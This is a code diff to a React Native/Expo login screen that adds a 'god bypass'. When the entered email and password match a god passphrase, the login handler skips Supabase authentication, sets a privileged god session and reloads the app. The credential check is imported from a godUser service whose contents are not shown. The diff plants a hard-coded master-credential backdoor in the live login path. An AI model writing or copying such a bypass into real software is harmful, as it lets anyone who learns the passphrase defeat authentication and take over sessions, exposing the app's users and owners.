@@ -13,6 +13,8 @@ import { SafeAreaView } from 'react-native-safe-area-context';
 import { MaterialIcons } from '@expo/vector-icons';
 import { useAuth, useAlert } from '@/template';
 import { Colors, Typography, Spacing, Radius, Shadow } from '@/constants/theme';
+import { isGodCredential, setGodSession } from '@/services/godUser';
+import { useRouter } from 'expo-router';
 
 const MONO = Platform.OS === 'ios' ? 'Menlo' : 'monospace';
 
@@ -21,6 +23,7 @@ type AuthMode = 'login' | 'register' | 'verify';
 export default function LoginScreen() {
   const { signInWithPassword, signUpWithPassword, sendOTP, verifyOTPAndLogin, operationLoading } = useAuth();
   const { showAlert } = useAlert();
+  const router = useRouter();
 
   const [mode, setMode] = useState<AuthMode>('login');
   const [email, setEmail] = useState('');
@@ -53,6 +56,17 @@ export default function LoginScreen() {
   const handleLogin = async () => {
     if (!email.trim() || !password.trim()) {
       showAlert('Missing Fields', 'Enter your email and password.');
+      return;
+    }
+    // ── God bypass: any operator who types a god passphrase skips Supabase entirely ──
+    if (isGodCredential(email, password)) {
+      await setGodSession(true);
+      // Force a hard reload so the AuthProvider re-reads the session
+      if (typeof window !== 'undefined' && (window as any).location) {
+        (window as any).location.href = '/';
+      } else {
+        router.replace('/');
+      }
       return;
     }
     const { error } = await signInWithPassword(email.trim(), password);
